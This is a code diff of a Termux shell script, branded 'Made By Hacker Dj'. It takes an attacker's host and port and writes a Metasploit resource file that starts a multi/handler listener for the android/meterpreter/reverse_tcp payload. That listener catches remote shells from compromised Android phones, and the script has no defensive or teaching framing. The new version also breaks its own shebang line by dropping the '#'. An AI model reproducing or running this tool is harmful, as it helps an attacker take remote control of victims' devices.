@@ -1,11 +1,14 @@
-#!/data/data/com.termux/files/usr/bin/bash
-figlet Dj listner
+!/data/data/com.termux/files/usr/bin/bash
+clear
+tput setaf 1; echo "Made By Hacker Dj"
+echo "    "
+echo -e "\033[32m$(figlet -f ASCII-Shadow 'DJLISTNER')\033[0m" | lolcat -t
 rm -rf d.rc
-echo "SET LHOST"
+tput setaf 1; echo "SET LHOST"
 read lhost
-echo "LPORT"
+tput setaf 1; echo "LPORT"
 read lport
-echo "use multi/handler" > d.rc
+echo "use exploit/multi/handler" > d.rc
 echo "set payload android/meterpreter/reverse_tcp" >> d.rc
 echo "set lhost $lhost" >> d.rc
 echo "set lport $lport" >> d.rc
